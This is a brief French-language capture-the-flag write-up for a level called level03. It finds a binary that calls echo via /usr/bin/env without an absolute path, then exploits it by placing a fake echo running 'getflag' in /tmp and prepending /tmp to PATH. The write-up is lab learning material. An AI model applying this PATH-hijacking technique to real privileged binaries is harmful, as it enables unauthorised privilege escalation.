1. Check fichiers liés à flag03 : find / -type f -user flag03 2>/dev/null ne trouve rien
2. ls -la -> on voit un binaire compilé level03
3. Remarque "/usr/bin/env echo Exploit me" dans le binaire
4. Check env, rien d'intéressant au premier abord
5. Google /usr/bin/env security vulnerability : https://medium.com/@santhossunthar/why-environment-variables-are-the-concern-in-security-context-04698c334477
4. Se rend compte que l'appel à echo dans ./level03 se fait sans chemin absolu -> env lance le premier echo trouvé dans le $PATH du env
5. Mission Hijack the PATH
- echo "getflag" > /tmp/echo (c'est le vrai echo bien sûr ;D)
- chmod +x /tmp/echo
- export PATH=/tmp:$PATH
- ./level03 -> gg